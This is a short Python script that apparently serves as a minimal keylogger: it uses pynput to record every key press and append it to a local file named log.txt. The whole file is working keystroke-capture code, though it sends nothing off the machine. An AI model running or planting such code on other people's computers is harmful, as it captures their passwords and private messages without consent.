from pynput.keyboard import Listener

def log_keystroke(key):
    key = str(key).replace("'", "")

    if key == 'Key.space':
        key = 'SPACE'
    if key == 'Key.shift_r':
        key = 'SHIFT'
    if key == "Key.enter":
        key = '\n ENTER'

    with open("log.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()